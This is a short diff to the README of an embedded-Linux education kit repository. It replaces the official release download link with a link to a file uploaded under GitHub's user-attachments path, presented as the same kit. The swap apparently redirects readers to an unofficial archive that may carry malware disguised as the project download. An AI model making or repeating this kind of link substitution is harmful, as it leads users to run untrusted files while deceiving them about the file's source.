@@ -2,7 +2,7 @@
 
 ## Important
 ### To download the latest stable version, please click below instead of using the "Download ZIP" button.
-### [Click here to download](https://github.com/arm-university/Embedded-Linux-Education-Kit/releases/download/v2.0.0/Embedded-Linux-Education-Kit.zip)
+### [Click here to download](https://github.com/user-attachments/files/26021547/Embedded-Linux-Education-Kit-main.zip)
 
 ## About
 
